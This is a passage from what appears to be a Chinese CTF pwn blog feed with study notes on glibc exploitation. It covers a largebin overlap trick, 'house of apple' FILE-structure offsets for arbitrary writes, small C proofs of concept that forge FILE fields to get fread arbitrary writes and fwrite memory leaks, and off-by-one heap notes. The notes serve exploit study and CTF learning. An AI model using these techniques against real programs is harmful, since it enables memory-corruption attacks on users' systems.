class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="实现overlap"><a href="#实现overlap" class="headerlink" title="实现overlap"></a>实现overlap</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用如下语句来实现overlap</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure>

<p>也就是哥哥该bk_nextsize字段，使其指向未释放的largebin，就可以实现，在此largebin中构造fd和bk绕过unlink，并且使nextsize域为空，绕过大块如链过程，然后就可以实现unlink攻击的效果。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>POC</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for SmallbinAttach</title>
    <url>/2024/08/19/SmallbinAttach/</url>
    <content><![CDATA[<blockquote>
<p>感觉挺恶心的回来用的时候再学吧（应用范围貌似没那么广）。</p>
</blockquote>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>POC</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>house of apple</title>
    <url>/2024/08/23/applepoc/</url>
    <content><![CDATA[<blockquote>
<p>参考文章地址：<a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p>
</blockquote>
<h1 id="APPLE1"><a href="#APPLE1" class="headerlink" title="APPLE1"></a>APPLE1</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="IO-wstrnfile-IO-wide-data"><a href="#IO-wstrnfile-IO-wide-data" class="headerlink" title="_IO_wstrnfile &amp;_IO_wide_data"></a>_IO_wstrnfile &amp;_IO_wide_data</h3><blockquote>
<p>重点知道overflow_buf的位置。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line">------------</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line">------------</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line">-----------</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">-------------</span><br><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="主要利用函数"><a href="#主要利用函数" class="headerlink" title="主要利用函数"></a>主要利用函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*vswprintf.c*/</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体布局"><a href="#结构体布局" class="headerlink" title="结构体布局"></a>结构体布局</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">amd64：</span><br><span class="line">FILE + <span class="number">0XF0</span> = overflow_buf;</span><br><span class="line">FILE + <span class="number">0X1F0</span> = overflow_buf结尾的下一个;</span><br><span class="line">FILE + <span class="number">0</span>X</span><br><span class="line">FILE:</span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="实现任意地址写"><a href="#实现任意地址写" class="headerlink" title="实现任意地址写"></a>实现任意地址写</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote>
<p>1.<code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF = 1</code></p>
<p>2.<code>fp-&gt;_mode &lt;= 0</code></p>
<p>3.<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
</blockquote>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE + <span class="number">0XD8</span> = _IO_wstrn_jumps</span><br><span class="line">FILE + <span class="number">0XA0</span> = _wide_data(改为目的地址)</span><br><span class="line">FILE + <span class="number">0XF0</span> = 想要的值</span><br><span class="line">_wide_data+<span class="number">0X0</span>=想要的值</span><br><span class="line">_wide_data+<span class="number">0X8</span>=想要的值</span><br><span class="line">_wide_data+<span class="number">0X10</span>=想要的值</span><br><span class="line">_wide_data+<span class="number">0X18</span>=*(FILE + <span class="number">0X1F0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h2><h1 id="APPLE2"><a href="#APPLE2" class="headerlink" title="APPLE2"></a>APPLE2</h1><blockquote>
<p>主要是几条调用链</p>
<p>[<a href="https://bbs.kanxue.com/thread-273832.htm#msg_header_h1_0">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
</blockquote>
<h1 id="APPLE3"><a href="#APPLE3" class="headerlink" title="APPLE3"></a>APPLE3</h1><blockquote>
<p>有点难，对宽字符处理方式一无所知，有机会再学吧，嘻嘻。</p>
</blockquote>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for IOFILE</title>
    <url>/2024/08/19/fread_poc/</url>
    <content><![CDATA[<blockquote>
<p>深入学习一下IO的比较简单的部分的源代码，并简单写一下poc</p>
<p>参考链接：<a href="https://xz.aliyun.com/t/6567?time__1311=n4+xnD0Dg7G=BhDBqooGkDRm8DCY1DuAAnOoD">https://xz.aliyun.com/t/6567?time__1311=n4%2BxnD0Dg7G%3DBhDBqooGkDRm8DCY1DuAAnOoD</a></p>
</blockquote>
<h1 id="DEMO1-Fread"><a href="#DEMO1-Fread" class="headerlink" title="DEMO1-Fread"></a>DEMO1-Fread</h1><blockquote>
<p>演示了如何利用fread进行任意地址写，主要就是将缓冲区构造成目标地址，需要注意的是缓冲区当占满的时候可能会被新数据覆盖，因此小心使用。简单总结一下原理：</p>
<p>1.将缓冲区读写和目标位置的读写分开，分成大概两个模块，一个是将缓冲区的数据读到目标位置，一个是利用系统调用将文件中的数据督导缓冲区，这两个模块都会维护读指针和缓冲区的关系。</p>
<p>2.总体方向就如1所说，其中的比较重要的细节可以分为（本人理解）：</p>
<p>​	2.1 缓冲区的分配，需要设置flag来绕过，否则就会覆盖之前构造好的指针</p>
<p>​	2.2 关于其他的flag，我的建议是越少越好，flag多的话，设计的函数也会变多，虽然说逻辑可以明白，但是非常混乱，包括但不限于，save buf的交替处理，读写缓冲区共用，等等，但是中心思想还是第一点所说的，这是非常重要的。</p>
<p>​	2.3 当write，read交替操作时，会先刷新write，然后尽可能移动readend和readptr，但这只是read缓冲区大小的扩充，不代表其获得了额外数据，还是得通过系统调用来调整。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*此程序演示了向test中写内容会先把内容写到msg中*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> msg[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> test[<span class="number">20</span>];</span><br><span class="line">    test[<span class="number">20</span>]=<span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    msg[<span class="number">20</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    FILE* fd = fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw+&quot;</span>);</span><br><span class="line">    <span class="comment">/*construct FILE*/</span></span><br><span class="line">    fd-&gt;_fileno = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_flags = <span class="number">0xFBAD0000</span>;</span><br><span class="line">    fd-&gt;_IO_read_base = msg;</span><br><span class="line">    fd-&gt;_IO_read_ptr = fd-&gt;_IO_read_end = msg + <span class="number">20</span>;</span><br><span class="line">    fd-&gt;_IO_buf_base = msg;</span><br><span class="line">    fd-&gt;_IO_buf_end = msg + <span class="number">20</span>;</span><br><span class="line">    fread(test,<span class="number">1</span>,<span class="number">19</span>,fd);</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="DEMO2-Fwrite"><a href="#DEMO2-Fwrite" class="headerlink" title="DEMO2-Fwrite"></a>DEMO2-Fwrite</h1><blockquote>
<p>控制FILE结构体达成任意地址内容泄露的目的</p>
<p>符号位绕过两个检查：</p>
<p>1.overflow的分配buf的检查，如果最近没有putting过或bufbase&#x3D;0则会分配buf。</p>
<p>2.绕过do_new_write的检查，如果非追加模式的话则会判断readend和writebase的大小，会将writebase移动到未知区域。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKEMESSAGE <span class="string">&quot;helloword\x00&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>*fakemsg = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(FAKEMESSAGE)+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(fakemsg,FAKEMESSAGE,<span class="built_in">strlen</span>(FAKEMESSAGE));</span><br><span class="line">    <span class="type">char</span>*victim = <span class="string">&quot;ooo&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">     FILE* fd = fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw+&quot;</span>);</span><br><span class="line">    <span class="comment">/*construct FILE*/</span></span><br><span class="line">    fd-&gt;_fileno = <span class="number">1</span>;</span><br><span class="line">    fd-&gt;_flags = <span class="number">0xFBAD1800</span>;</span><br><span class="line">    fd-&gt;_IO_read_base = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    fd-&gt;_IO_buf_base = fakemsg;</span><br><span class="line">    fd-&gt;_IO_buf_end = fakemsg + <span class="number">100</span>;</span><br><span class="line">    fd-&gt;_IO_write_base = fakemsg;</span><br><span class="line">    fd-&gt;_IO_write_end = fd-&gt;_IO_write_ptr = fakemsg+<span class="built_in">strlen</span>(FAKEMESSAGE);</span><br><span class="line">    fwrite(victim,<span class="number">1</span>,<span class="number">3</span>,fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行结果如下：可以看见输出了目标地址的内容（以ASCII的形式）</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/poc# ./writepoc </span><br><span class="line">hellowordoooroot@L:/home/l/poc# </span><br></pre></td></tr></table></figure>





























]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>POC</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>fmtstr一些源码学习</title>
    <url>/2024/08/13/fmtstr/</url>
    <content><![CDATA[<h2 id="1-printf"><a href="#1-printf" class="headerlink" title="1. printf"></a>1. printf</h2><h3 id="a-printf"><a href="#a-printf" class="headerlink" title="a.__printf"></a>a.__printf</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br></pre></td></tr></table></figure>

<h3 id="b-vfprintf-internal"><a href="#b-vfprintf-internal" class="headerlink" title="b.__vfprintf_internal"></a>b.__vfprintf_internal</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>fmtstr</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>fmtstr</tag>
      </tags>
  </entry>
  <entry>
    <title>heap利用(入门)</title>
    <url>/2024/08/01/heap%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h1><p>在一个可以写的区域伪造chunk（通过off-by-one使系统的指向chunk的指针能指向伪造chunk）</p>
<p><strong>注意chunk的大小的构造</strong></p>
<p><strong>其中指针有多层，因此可以泄露并且修改，p2地址泄露之后，覆盖p2为想要操作的地址，将p4将内容改为想要的内容</strong></p>
<ol>
<li><strong>p1-&gt;p2-&gt;内容</strong></li>
<li><strong>p1-&gt;p4-&gt;内容(更改p1的值)</strong></li>
</ol>
<p><strong>3.p1-&gt;p4-&gt;新内容（更改p1的指向的值）</strong></p>
<p><strong>对于一二步骤p1在第二层，但是对于第一步骤p1在第一层</strong></p>
<p><strong>想更改p1的间接内容，需要更新p1的指向为p4，需要把p1移到第二层（先泄露&amp;p1，然后再一个块的内部伪造一个新的chunk，其中放入&amp;p1，成功将其到第二层），通过fakechunk的一些操作可以更改p1的值（也就是改为&amp;p4），这样可以更改p4指向的内容，那么p1应该改成什么（改成泄露的重要地址，此题通过p1的指向来泄露，也就是&amp;p4和&amp;p2有着千丝万缕的关系）</strong></p>
<p><strong>更改p的值，和p的指向的值</strong></p>
